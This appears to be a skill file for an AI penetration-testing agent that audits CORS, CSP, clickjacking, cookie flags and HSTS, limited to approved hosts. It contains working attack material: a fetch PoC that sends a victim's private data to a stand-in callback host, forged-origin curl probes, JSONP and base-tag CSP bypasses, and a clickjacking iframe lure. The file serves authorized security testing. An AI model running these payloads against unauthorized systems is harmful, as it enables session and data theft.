---
name: harness-headers
description: "Audit security headers, CORS misconfiguration, CSP bypass, clickjacking, and cookie flags. Policy analysis with proof-of-concept."
---

# Headers — CORS, CSP, clickjacking, cookie flags

Source: `testing-cors`, `testing-csp`, `testing-clickjacking`, `security-headers` (2024: CORS null origin, CSP via JSONP on whitelisted CDN, SameSite=None+Secure bypass).

## Gate

Approved `host` only. Every command via `cyber_process` `argv`. Read-only analysis — no state modification. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Header inventory — baseline

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","<url>/"]
```

Extract and record every security-relevant response header. Hash the full header set as baseline observation.

### 2. CORS — systematic Origin probing

Five probes, each tests a different reflection pattern:

```
cyber_process argv=["curl","-sS","-D","-","-H","Origin: https://evil.example","<url>/api/me"]
cyber_process argv=["curl","-sS","-D","-","-H","Origin: null","<url>/api/me"]
cyber_process argv=["curl","-sS","-D","-","-H","Origin: https://<target>.evil.example","<url>/api/me"]
cyber_process argv=["curl","-sS","-D","-","-H","Origin: https://<target>evil.example","<url>/api/me"]
cyber_process argv=["curl","-sS","-D","-","<url>/api/me"]
```

For each, record `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`.

| Probe | ACAO reflects attacker | ACAC: true | Classification |
|---|---|---|---|
| `evil.example` | yes | yes | arbitrary CORS credential theft candidate |
| `evil.example` | yes | no | limited: no cookies sent cross-origin |
| `null` | yes | yes | sandbox/file CORS credential theft candidate |
| `<target>.evil.example` | yes | yes | subdomain-suffix bypass candidate |
| No `Origin` | wildcard `*` | n/a | public API, check if sensitive data returned |

### 3. CORS exploitation PoC

If `ACAO` reflects attacker origin with `ACAC: true`, deliver the credential theft proof:

```
cyber_process argv=["curl","-sS","-D","-","-H","Origin: https://evil.example","-H","Cookie: <session>","<url>/api/me"]
```

If the response includes private data with the attacker origin reflected → build the fetch PoC:

```javascript
// Host on evil.example, victim visits while logged in
fetch('https://<target>/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://CALLBACK/cors?data=' + btoa(d)));
```

The finding is the combination: reflected origin + credentials flag + private data in body.

### 4. CSP — parse and probe

```
cyber_process argv=["curl","-sS","-D","-","<url>/"]
```

Extract `Content-Security-Policy` header. Parse each directive.

| Directive found | Bypass probe | Command |
|---|---|---|
| `script-src 'unsafe-inline'` | XSS via inline `<script>` | direct injection if reflected |
| `script-src cdn.example.com` | JSONP callback on that CDN | `cyber_process argv=["curl","-sS","https://cdn.example.com/api?callback=alert(1)"]` |
| `script-src 'nonce-X'` | nonce reuse across requests | fetch page twice, compare nonce values |
| No `object-src` | object/embed injection | `<object data="data:text/html,<script>alert(1)</script>">` |
| No `base-uri` | base tag hijack | `<base href="https://evil.example/">` |
| `default-src 'self'` only | upload JS to same origin | requires file upload vector |

For JSONP bypass, search for callback endpoints on whitelisted domains:

```
cyber_process argv=["curl","-sS","https://<whitelisted-cdn>/api/jsonp?callback=alert(document.domain)"]
```

If the CDN returns `alert(document.domain)(...)` → CSP bypass via JSONP candidate.

### 5. Clickjacking — frame test

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","<url>/sensitive-action"]
```

Check for `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`. If both absent:

```html
<iframe src="https://<target>/sensitive-action"
  style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%">
</iframe>
<button style="position:relative;z-index:1">Click me for reward</button>
```

If the page loads in the iframe and contains a state-changing action (delete, transfer, settings change) → clickjacking candidate. If `X-Frame-Options: DENY` or `frame-ancestors 'none'` → negative control.

### 6. Cookie flags audit

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","<url>/login"]
```

For each `Set-Cookie` in the response:

| Flag | Missing impact | Check |
|---|---|---|
| `Secure` | cookie sent over HTTP | `cyber_process argv=["curl","-sS","-D","-","http://<target>/"]` — cookie echoed? |
| `HttpOnly` | JS can read via `document.cookie` | XSS → session theft |
| `SameSite=None` without `Secure` | browser rejects | parse the flag |
| `Domain=.example.com` | all subdomains receive cookie | overly broad scope |

### 7. HSTS and transport

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","https://<target>/"]
```

Check `Strict-Transport-Security`. If absent, test HTTP downgrade:

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","http://<target>/"]
```

If HTTP responds without redirect to HTTPS → HSTS missing + no redirect = downgrade candidate.

### 8. Negative controls

| Control | Probe | Expected |
|---|---|---|
| Same-origin request | `Origin: https://<target>` | ACAO reflects own origin, normal |
| No Origin header | omit `Origin` | no ACAO or wildcard only |
| Strict CSP page | inject `<script>` on page with tight CSP | blocked by CSP |
| Framing with `X-Frame-Options: DENY` | iframe load | refused |
| `Secure` cookie over HTTPS | normal login | cookie set |

### Stop

State-changing requests, real user sessions, production clickjacking exploitation.

### Evidence ids

Keep header-baseline, each CORS probe (5), CSP parse, JSONP probe, clickjacking iframe test, cookie flag audit, HSTS probe, and all controls as separate observations. Record full response headers.

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| `evil.example` reflected in ACAO + ACAC: true + private body | 3 conditions met | CORS credential theft candidate |
| `evil.example` reflected but ACAC absent | no credentials cross-origin | informational |
| `Origin: null` accepted with ACAC: true | sandbox bypass | CORS null-origin candidate |
| JSONP endpoint on whitelisted CDN returns callback | CSP bypass payload executes | CSP bypass candidate |
| Nonce identical across 3 requests | nonce reuse | CSP nonce reuse candidate |
| `X-Frame-Options` and `frame-ancestors` both absent on state-changing page | iframe loads | clickjacking candidate |
| `X-Frame-Options: DENY` present | iframe blocked | negative control confirmed |
| Session cookie missing `HttpOnly` + XSS present | cookie readable via JS | session theft chaining |
| HSTS absent + HTTP serves content without redirect | HTTP downgrade possible | HSTS missing (informational unless paired) |

A missing header alone is informational. The finding is the **exploitable condition** (CORS + credentials + data, CSP bypass + XSS, clickjacking + state change).

## Done

`cyber_finding` cites the header value, the exploitation PoC or proof chain, and all controls. Missing `Referrer-Policy` without sensitive URL parameters stays informational. Untested directives stay `not-tested`.
